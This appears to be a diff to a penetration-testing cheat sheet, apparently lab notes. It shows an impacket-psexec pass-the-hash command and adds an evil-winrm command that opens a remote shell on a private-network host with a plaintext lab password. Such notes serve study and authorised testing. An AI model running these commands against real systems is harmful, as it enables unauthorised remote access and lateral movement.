@@ -25,3 +25,7 @@ Example:
 ```bash
 impacket-psexec administrator@10.0.0.25 -hashes aad3b435b51404eeaad3b435b51404ee:6c598d4edc98d4edc98d0a0c9797ef98b869751
 ```
+# evil-winrm
+```bash
+evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"
+```
